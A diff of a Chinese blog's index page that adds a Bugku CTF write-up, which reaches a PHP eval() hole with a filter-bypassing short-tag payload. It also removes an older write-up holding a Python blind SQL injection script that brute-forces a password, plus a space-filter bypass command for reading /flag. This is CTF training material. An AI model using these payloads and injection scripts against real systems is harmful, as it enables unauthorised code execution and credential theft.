@@ -164,6 +164,113 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-bugku-web-闪电十六鞭" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">bugku-web-闪电十六鞭</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/" class="archive-article-date">
+  	<time datetime="2021-08-12T06:00:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>参考这篇——<a target="_blank" rel="noopener" href="https://www.cnblogs.com/fallingskies/p/14287103.html">https://www.cnblogs.com/fallingskies/p/14287103.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&#39;&#x2F;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">    $exam &#x3D; &#39;return\&#39;&#39;.sha1(time()).&#39;\&#39;;&#39;;</span><br><span class="line"></span><br><span class="line">    if (!isset($_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;&lt;a href&#x3D;&quot;.&#x2F;?flag&#x3D;&#39;.$exam.&#39;&quot;&gt;Click here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (strlen($_GET[&#39;flag&#39;]) !&#x3D; strlen($exam)) &#123;</span><br><span class="line">        echo &#39;长度不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (preg_match(&#39;&#x2F;&#96;|&quot;|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit&#x2F;is&#39;, $_GET[&#39;flag&#39;])) &#123;</span><br><span class="line">        echo &#39;关键字不允许&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if (eval($_GET[&#39;flag&#39;]) &#x3D;&#x3D;&#x3D; sha1($flag)) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &#39;马老师发生甚么事了&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>当没有用GET方法传入flag时，会显示Click here的链接。</p>
+<p>点击链接会用GET方法传入一串字符串$exam，后面是当前时间的一串sha1哈希值。</p>
+<p>判断传入的flag长度与$exam是否相同，不同则显示  长度不允许</p>
+<p>第二个判断过滤了一大堆</p>
+<p>第三个判断传入flag的值等于flag值的哈希值，正确就输出flag。用的是严格的三个等号的比较，我们flag都不知道，哈希值更不可能知道了，==</p>
+<p>但容易发现此处存在任意代码执行漏洞， </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[&#39;flag&#39;])</span><br></pre></td></tr></table></figure>
+
+<p>尝试绕过过滤</p>
+<p>echo被过滤了，用php短标签进行输出</p>
+<p>flag被过滤了，用先赋其他值，再修改的方法绕过</p>
+<p>当php开启短标签后，</p>
+<p>能正常解析类似于这样形式的php文件： phpinfo() ?&gt;</p>
+<p>并且可以使用<?=$a?>的形式输出</p>
+<p>$exam字符串长度为49</p>
+<p>为了使payload长度与$exam长度相等，在代码间加入无意义的语句。</p>
+<p>构造payload：$a=blag;$a{0}=f;111111111111111111111;?&gt;<?=$$a;?></p>
+<p>成功得到flag</p>
+<img src="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/1.PNG" class="" title="1.PNG">
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/08/12/bugku-web-%E9%97%AA%E7%94%B5%E5%8D%81%E5%85%AD%E9%9E%AD/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-bugku-web-xxx二手交易市场" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1014,104 +1121,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/08/11/bugku-web-login2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-都过滤了" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">bugku-web-都过滤了</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/" class="archive-article-date">
-  	<time datetime="2021-08-11T05:33:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这道题本来有个DS_Store源码泄露漏洞，不过后来被修了</p>
-<p>现在只能通过sql注入</p>
-<p>另外，如果这道题你手注爆破的思路没有问题，但是怎么都爆破不出来……不要怀疑自己，就是平台的锅，因为这玩意动不动就挂掉，根本就爆破不出来</p>
-<p>看提示没有过滤<code>^</code>和<code>-</code>，可以用异或注入</p>
-<p>可以自己传<code>admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))=&quot; + str(ord(j)) + &quot;)-&#39;</code>改变j的值测试一下，会发现只有一个的回显是<code>username error</code>,其余都是<code>password error</code></p>
-<p>然后跑脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!-*-coding:utf-8-*-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;114.67.246.176:15484&#x2F;login.php&quot;</span><br><span class="line"></span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    payload1 &#x3D; &quot;admin&#39;^(length(passwd)&#x3D;&quot; + str(i) + &quot;)^&#39;&quot;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload1,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">    &#125;</span><br><span class="line">    r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">    if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">        print(&quot;密码的长度是&quot;+str(i))</span><br><span class="line">        break</span><br><span class="line">for i in range(1, 33):</span><br><span class="line">    for j in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">        payload &#x3D; &quot;admin&#39;-(ascii(mid((passwd)from(&quot; + str(i) + &quot;)))&#x3D;&quot; + str(ord(j)) + &quot;)-&#39;&quot;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">        &#39;uname&#39;: payload,</span><br><span class="line">        &#39;passwd&#39;: &#39;123&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        r &#x3D; requests.post(url&#x3D;url, data&#x3D;data)</span><br><span class="line">        #print(r.content)</span><br><span class="line">        if &quot;username error!!@_@&quot; in r.text:</span><br><span class="line">            password +&#x3D; j</span><br><span class="line">            print(password)</span><br><span class="line">            break</span><br><span class="line">print(&quot;密码是&quot;+password)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>得到一串md5，解码出来是<code>bugkuctf</code>,猜出密码是admin，直接登录</p>
-<p>shell界面上，发现过滤了空格，读取权限也不全，flag又不在当前文件夹，只能盲猜flag在根目录<br>所以<code>cat&lt;&gt;/flag</code>得到flag</p>
-<img src="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/1.PNG" class="" title="1.PNG">
-
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/11/bugku-web-%E9%83%BD%E8%BF%87%E6%BB%A4%E4%BA%86/">展开全文 >></a>
         </p>
       
 
